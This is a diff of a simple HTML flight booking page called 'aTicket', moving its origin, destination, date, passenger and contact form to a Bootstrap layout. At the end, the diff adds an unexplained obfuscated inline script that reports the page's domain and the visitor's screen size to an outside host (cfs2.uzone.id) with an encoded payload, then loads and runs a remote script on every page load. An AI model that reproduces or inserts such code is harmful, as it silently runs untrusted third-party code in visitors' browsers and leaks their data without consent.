@@ -1,41 +1,27 @@
-<!DOCTYPE html> 
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8"> 
-  <link rel="stylesheet" type="text/css" href="css/pickFlightstyle.css"> 
-  <link rel="stylesheet" href="https://ajax.googleapis.com/ajax/libs/jqueryui/1.11.4/themes/smoothness/jquery-ui.css"> 
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script> 
-  <script src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.11.4/jquery-ui.min.js"></script> 
-  <script src="js/jquery-1.11.2.min.js"></script>     
+  <title>Pick A Flight</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="css/bootstrap.min.css">
+  <link rel="stylesheet" href="css/jumbotron.css">
+  <script src="js/jquery-3.1.1.min.js"></script>
+  <script src="js/bootstrap.min.js"></script>
+</head>
+<body>
+
+<div class="jumbotron text-center" style="background-image: url(aticketpics/pic9.jpg); background-size: cover;">
+    <h1>aTicket</h1>
+  <p>your booking solution</p> 
+</div>
   
-  <script> 
-    $(document).ready(function() { 
-     $("#datepicker").datepicker();  
-    }); 
-  </script>  
-   
-  <script src="bookingvalidation.js"></script>
-
-</head> 
- 
-     <h1 class="page-title">aTicket</h1> 
-     <nav>      
-       <ul>       
-       <li><a href="#Flight">Flight</a></li> 
-       <li><a href="#Hotel">Hotel</a></li> 
-       <li><a href="#Promo">Promo</a></li> 
-       <li><a href="signIn.html">Sign In</a></li>       
-       <li><a href="signUp.html">Sign Up</a></li> 
-       <li><a href="contact">Contact Us</a></li> 
-       </ul> 
-     </nav> 
-     <div class="flex-container"> 
-        <div class="flex-item"> 
-          <form name="validity" onsubmit="return bookingValidation();" action="confirm.html" width=100px;>             
-             <ul>
-             <h3>1. Flight Destination</h3>
-             <li><label for="origin">Origin:</label></li>                                     
-             <li><select name="city" required> 
+<div class="container">
+  <div class="row">
+    <div class="col-sm-4">
+      <h3>Choose your Place</h3>
+        <li><label for="origin">Origin:</label></li>                                     
+                <li><select name="city" required> 
                     <option selected="" value="Default">(Please select a city)</option> 
                     <option value="BDO">Bandung</option> 
                     <option value="DPS">Denpasar</option> 
@@ -44,10 +30,10 @@
                     <option value="SRG">Semarang</option> 
                     <option value="SUB">Surabaya</option> 
                     <option value="SIN">Singapore</option> 
-                 </select> 
-             </li>
-             <li><label for="destination">Destination:</label></li>              
-             <li><select name="city" required> 
+                    </select> 
+                </li>
+        <li><label for="destination">Destination:</label></li>              
+                <li><select name="city" required> 
                     <option selected="" value="Default">(Please select a city)</option> 
                     <option value="BDO">Bandung</option> 
                     <option value="DPS">Denpasar</option> 
@@ -56,16 +42,20 @@
                     <option value="SRG">Semarang</option> 
                     <option value="SUB">Surabaya</option> 
                     <option value="SIN">Singapore</option> 
-                 </select> 
-             </li>
-
-             <h3>2. Date of Flight</h3> 
-             <li><label for="departdate">Depart:</label></li> 
+                    </select> 
+                </li>
+    </div>
+    <div class="col-sm-4">
+      <h3>Choose you Time</h3>
+        <li><label for="departdate">Depart:</label></li> 
              <li><input id="datepicker" required></li>   
-             <li><input type="radio" name="ways" value="returndate">Return:</li> 
-             <li><input id="datepicker"></li> 
-             <h3>3. Passenger</h3> 
-             <li>Adult: above 12 years old<span> 
+        <li><input type="radio" name="ways" value="returndate">Return:</li> 
+             <li><input id="datepicker"></li>
+        
+    </div>
+    <div class="col-sm-4">
+      <h3>Choose your Date</h3>        
+      <li>Adult: above 12 years old<span> 
                <select name="numberadult" required> 
                        <option value="0">0</option> 
                        <option value="1">1</option> 
@@ -82,16 +72,16 @@
                         <option value="3">3</option> 
                         <option value="4">4</option> 
                </select></span></li>
-             <h3>4. Passenger Contact</h3>
+      <li>Passenger Contact</li>
                <li><label for="username">Name:</label></li>
-               <li><input type="text" name="username" size="50" required/></li>
-               <li><label for ="phonenumber">Phone Number:</label></li>
-               <li><input type="" name="phonenumber" size="50" required/></li>
+               <li><input type="text" name="username" size="30" placeholder="Full name " required/></li>
+               <li><label for ="mobilenumber">Mobile Number:</label></li>
+               <li><input type="" name="mobilenumber" size="30" placeholder="Mobile Number" required/></li>
              <br>  
-             <input type="submit" value="Submit" required> 
-             </ul>
-        </div> 
-        
-     </div> 
-</body> 
-</html> 
+             <input type="submit" value="Submit" required>   
+    </div>
+  </div>
+</div>
+
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "¶ms=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKmlcXJtVROIXUnY5lLuxYHeE8tmWMCeMn%2bDCigxjaG%2ffVw580xMyAw1kZJ%2b2d0VI4vDuFUwZeVqdTeldm4VpLKEy7UcFEh3EPthufAc4LTn4Xcc7Vf2O%2fsX4ZorFQ1L3%2fm8KTI3afYvhYem9g8PAruJqEme1e4xefs3NLuEEFa%2blQxXd5%2fxe60XupPVWHmFzVm9JYbM1iRPrZLrusCzLOIPSfTfUKwzHXsQS0g97VB2zpBzbveq0l9MZ2VnL2Vg8342tJOPB%2fPvQko%2bmiZNfF9q5ewoeYP2QioZ9grz2CHII5LmnHY8OXC5KToZocgmiXHuCj5gBwwLwPIo9Hg857v8Ea%2fIzUoeJlsBmUvbczG%2bGsNJ7oyRqVxTrHQAlhe1PMJYgR1XXiII7txWOMWfAQekAPkfi9WRHGj0gJoee9U6EmItBrppRjOyEREY%2bKQpyPRz7U2k07KttG2ooR38jm98MwY7etdFITnzT%2bUK5WgwEgnaRg1yEEhu6tr5gNFseFM9Z2n8rLl%2bQqg2iEQIXjTOUzLGVL74a2" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
